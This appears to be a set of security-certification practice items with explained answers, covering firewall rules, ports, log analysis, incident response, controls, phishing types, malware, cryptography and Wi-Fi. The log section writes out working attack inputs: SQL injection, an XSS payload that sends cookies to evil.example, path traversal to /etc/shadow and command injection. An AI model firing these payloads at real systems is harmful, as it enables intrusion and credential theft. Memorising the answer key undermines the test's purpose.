s:
Configure the perimeter firewall for a small company. Rules are processed top to bottom, first match wins. Requirements:
• Anyone on the internet can reach the web server over HTTPS only.
• Anyone can query the public DNS server.
• Only the IT management subnet can SSH to the web server.
• Everything else is blocked.
x:
Web server     10.1.1.10
DNS server     10.1.1.53
IT mgmt subnet 10.10.10.0/24

RULE  ACTION  SOURCE      DEST        PORT
1     PERMIT  ANY         10.1.1.10   [ ? ]
2     PERMIT  ANY         10.1.1.53   [ ? ]
3     PERMIT  [ ? ]       10.1.1.10   TCP 22
4     [ ? ]   ANY         ANY         ANY

i.p: Rule 1 destination port
i.w: HTTPS runs on TCP 443. Allowing 80 would also permit unencrypted HTTP, which the requirement rules out.

i.p: Rule 2 destination port
i.w: DNS queries use UDP 53 (TCP 53 is used for large responses and zone transfers). 161 is SNMP, 25 is SMTP.

i.p: Rule 3 source
i.w: Only the IT management subnet should reach SSH, so the source is 10.10.10.0/24. ANY would expose SSH to the whole internet.

i.p: Rule 4 action
i.w: The last rule is the implicit/explicit deny: block anything the rules above didn't allow.

i.p: Where must the deny-all rule sit?
i.w: First match wins. A deny-all at the top would match everything and block the permitted traffic too.

s: Match each service to its default port. Port numbers show up in firewall-rule and log PBQs constantly.

i.p: SSH / SFTP
i.w: SSH and SFTP (file transfer over SSH) both use TCP 22.

i.p: Telnet (insecure remote shell)
i.w: Telnet uses TCP 23 and sends everything, passwords included, in cleartext. Replace it with SSH.

i.p: SMTP (sending email)
i.w: SMTP uses TCP 25 between mail servers.

i.p: DNS
i.w: DNS uses UDP 53 for queries and TCP 53 for zone transfers.

i.p: Kerberos
i.w: Kerberos authentication uses port 88.

i.p: SNMP
i.w: SNMP polling uses UDP 161 (traps use 162). Use SNMPv3 for encryption.

i.p: LDAP
i.w: LDAP uses 389 and is unencrypted.

i.p: LDAPS
i.w: LDAP over TLS uses 636.

i.p: HTTPS
i.w: HTTPS uses TCP 443.

i.p: Syslog
i.w: Syslog uses UDP 514 by default, often forwarded to a SIEM.

i.p: IMAPS
i.w: IMAP over TLS uses 993 (plain IMAP is 143).

i.p: RDP
i.w: Remote Desktop uses TCP 3389. It's a common brute-force target, so never expose it directly to the internet.

t: Identify the attack from the logs
s: A SIEM has flagged the following entries. Pick the attack each one shows.

i.p: GET /products.php?id=7' OR '1'='1' -- HTTP/1.1  200
i.w: ' OR '1'='1' -- makes the WHERE clause always true and comments out the rest of the query. Fix: parameterized queries and input validation.

i.p: POST /comments  body: <script>fetch('https://evil.example/c?'+document.cookie)</script>
i.w: A <script> tag stored in a comment runs in other visitors' browsers and steals their cookies. Fix: output encoding, input validation, CSP.

i.p: GET /download?file=../../../../etc/shadow  200
i.w: ../ sequences climb out of the web folder to read system files. Fix: validate paths and run the web server with least privilege.

i.p: GET /ping?host=8.8.8.8;cat%20/etc/passwd
i.w: The ; ends the intended command and runs a second OS command. Fix: never pass user input to a shell; use allow lists.

i.p:
09:01:02 login FAILED user=jsmith
09:01:03 login FAILED user=jsmith
09:01:04 login FAILED user=jsmith  (x400)
i.w: Hundreds of rapid failures against one account means many passwords against one user. Fix: account lockout, MFA, rate limiting.

i.p:
09:00 FAILED user=amy pw=Fall2026!
09:00 FAILED user=bob pw=Fall2026!
09:01 FAILED user=cara pw=Fall2026!  (x300 users)
i.w: One common password tried across many accounts stays under per-account lockout thresholds. That pattern is password spraying.

i.p:
08:02 login OK user=dlee src=San Antonio, US
08:19 login OK user=dlee src=Bucharest, RO
i.w: Nobody can travel from Texas to Romania in 17 minutes, so the credentials are likely compromised. Fix: conditional access and MFA.

i.p: named: qry_type AXFR zone corp.example from 203.0.113.50
i.w: An AXFR from an outside IP dumps every DNS record, which maps the internal network. Fix: restrict zone transfers to secondary DNS servers.

s: Ransomware hit an accounting laptop. Put each action in the incident response phase it belongs to.

i.p: Write the IR plan, build the team, and stock a forensic toolkit
i.w: Preparation happens before any incident.

i.p: The EDR alerts on mass file renames with a .locked extension
i.w: Detection is noticing that something happened, often through an alert.

i.p: Determine which systems and data are affected and how it got in
i.w: Analysis scopes the incident and confirms what's really going on.

i.p: Pull the laptop off the network and disable the user's VPN account
i.w: Containment stops the spread. Isolate first, then fix.

i.p: Wipe and reimage the laptop and remove the malicious scheduled task
i.w: Eradication removes the threat and its persistence.

i.p: Restore files from a clean backup and watch the device closely
i.w: Recovery returns systems to normal operation, with extra monitoring.

i.p: Hold a meeting to update the playbook and add email attachment filtering
i.w: Lessons learned (post-incident review) improves defenses for next time.

s: Classify each security control by category: Technical (enforced by systems), Managerial (planning and oversight), Operational (carried out by people), or Physical (protects the physical space).

i.p: Next-generation firewall
i.w: Hardware and software that enforce security are technical controls.

i.p: Annual risk assessment
i.w: Risk assessments and policies are managerial: they guide decisions.

i.p: Security awareness training
i.w: Training is carried out by people, so it's operational.

i.p: Bollards in front of the data center entrance
i.w: Bollards physically stop vehicles.

i.p: Acceptable use policy
i.w: Policies are managerial controls.

i.p: Full-disk encryption on laptops
i.w: Encryption is enforced by technology.

i.p: Badge reader on the server room door
i.w: It controls physical access to a space.

i.p: Help desk follows a call-back procedure before password resets
i.w: A procedure that people follow day to day is operational.

s: Pick the control type that best describes each one.

i.p: A sign reading "This area is under 24/7 video surveillance"
i.w: Signs discourage an attacker but don't physically stop them.

i.p: A firewall rule that blocks inbound RDP
i.w: It stops the action from happening.

i.p: An IDS alert on a port scan
i.w: It identifies and reports activity after it starts.

i.p: Restoring a server from backup after ransomware
i.w: It fixes things after an incident.

i.p: A legacy system that can't be patched is isolated on its own VLAN with extra monitoring
i.w: It's an alternative control used when the normal control (patching) isn't possible.

i.p: A policy stating that all staff must lock their screens when away
i.w: Directive controls tell people what to do.

s: Identify the social engineering technique in each scenario.

i.p: Thousands of employees get an email saying their mailbox is full, with a link to a fake login page
i.w: A broad, untargeted email campaign is phishing.

i.p: An email to the payroll team names their manager and the new benefits portal they just announced
i.w: It's targeted at a specific group using details about them.

i.p: The CFO gets a personalized email about an "urgent acquisition" asking for wire details
i.w: Phishing aimed at an executive is whaling.

i.p: A caller claims to be from the bank's fraud department and asks for a one-time code
i.w: Voice phishing is vishing.

i.p: A text message says a package is held and links to a fake delivery site
i.w: SMS phishing is smishing.

i.p: Someone in a vendor vest says they're there to inspect the HVAC and need server room access
i.w: A made-up scenario (pretext) builds trust to gain access.

i.p: Attackers compromise a local industry forum that the target company's engineers visit
i.w: Infecting a site the targets already trust and visit is a watering hole attack.

i.p: A fake site at micros0ft-support.com collects logins
i.w: A misspelled look-alike domain is typosquatting.

i.p: A vendor's real email account is hacked and used to send "updated" bank details for invoices
i.w: BEC uses a legitimate (compromised) business account to redirect payments.

s: Match each behavior to the malware type.

i.p: Encrypts files and demands cryptocurrency for the key
i.w: Encryption plus a ransom demand.

i.p: Spreads across the network by itself through an unpatched SMB flaw
i.w: Worms self-replicate without user action.

i.p: A free "PDF converter" that secretly opens a backdoor
i.w: Trojans pretend to be legitimate software.

i.p: Hides deep in the OS and kernel and hides its own processes from tools
i.w: Rootkits hide themselves with elevated privileges.

i.p: Records every key pressed and sends the log to the attacker
i.w: Keyloggers capture keystrokes such as passwords.

i.p: Code that deletes the database if a certain employee is removed from payroll
i.w: Logic bombs trigger on a date or condition, often planted by an insider.

i.p: Quietly tracks browsing and collects personal data
i.w: Spyware monitors and collects information.

i.p: Runs entirely in memory through PowerShell, with no files written to disk
i.w: Fileless malware lives in memory and abuses built-in tools, which makes it hard for signature-based antivirus to catch.

s: Pick the technology or technique that meets each requirement.

i.p: Prove a downloaded file hasn't been changed
i.w: Compare the file's hash with the published one. If the file changed, the hash changes.

i.p: Make identical passwords produce different stored hashes and defeat rainbow tables
i.w: A random salt added to each password makes precomputed tables useless.

i.p: Prove who sent an email and that it wasn't altered (non-repudiation)
i.w: Signed with the sender's private key, verified with their public key.

i.p: Replace credit card numbers with random values that map back only in a secure vault
i.w: Tokens have no mathematical link to the real data.

i.p: Hide a message inside an image file
i.w: Steganography hides data inside other data.

i.p: Make a weak password much slower to brute-force (for example, PBKDF2 or bcrypt)
i.w: Running the hash many times makes each guess expensive.

i.p: Check in real time whether a certificate has been revoked
i.w: OCSP answers revocation queries for one certificate at a time. A CRL is a downloaded list.

i.p: A network appliance that stores and manages keys for many servers
i.w: A hardware security module is a dedicated, tamper-resistant key appliance.

i.p: A chip on a laptop's motherboard that stores the full-disk encryption key
i.w: The Trusted Platform Module is built into the device.

s: Pick the access control model or principle that fits each scenario.

i.p: Nurses get access to patient charts because of their job title
i.w: Access tied to a job role is RBAC.

i.p: Access is granted only if department = Finance AND location = HQ AND device = managed
i.w: Several attributes evaluated together make ABAC.

i.p: Files carry labels like Secret or Top Secret, and users need matching clearance
i.w: Labels and clearances set by the system are MAC. Users can't change them.

i.p: The owner of a shared folder decides who can open it
i.w: The owner sets permissions at their discretion.

i.p: The VPN allows logins only between 7 a.m. and 7 p.m.
i.w: A system-wide rule, like time of day, applies to everyone.

i.p: A new intern gets only the access needed for their tasks
i.w: The minimum access needed to do the job.

i.p: Admin rights are granted for 2 hours to apply a patch, then removed automatically
i.w: Temporary elevated access (part of PAM) limits standing privileges.

s: Configure Wi-Fi for a company office with employee laptops and a guest network.

i.p: Employee network security mode
i.w: Enterprise mode gives each person their own login through 802.1X instead of one shared password. WPA3 is the newest standard.

i.p: Server that checks employee credentials
i.w: 802.1X passes the login to a RADIUS server, which checks the directory.

i.p: EAP type that needs a certificate only on the server
i.w: PEAP builds a TLS tunnel with the server certificate, then sends the user's password inside it. EAP-TLS needs certificates on both sides.

i.p: Guest network
o: Separate VLAN with a captive portal
No password and bridged to the LAN
i.w: Keep guests off the internal network. A captive portal shows terms and controls access.

i.p: Feature to turn off on the access point
i.w: WPS PINs can be brute-forced, so disable it.

i.p: Best way to find rogue access points and dead spots
i.w: A wireless site survey maps signal coverage and finds unknown access points.

s: An audit found these insecure protocols in use. Pick the secure replacement for each.

i.p: Telnet for router management
i.w: SSH encrypts the remote session.

i.p: HTTP on the login page
i.w: HTTP over TLS encrypts the traffic.

i.p: FTP for file uploads
i.w: SFTP runs over SSH. TFTP has no security at all.

i.p: SNMPv2c with "public" community strings
i.w: v3 adds authentication and encryption.

i.p: LDAP binds to the directory
i.w: LDAP over TLS (636) protects directory credentials.

i.p: POP3 for email clients
i.w: Use the TLS versions of the mail retrieval protocols.

i.p: DNS responses could be forged
i.w: DNSSEC signs DNS records so clients can check they're genuine.
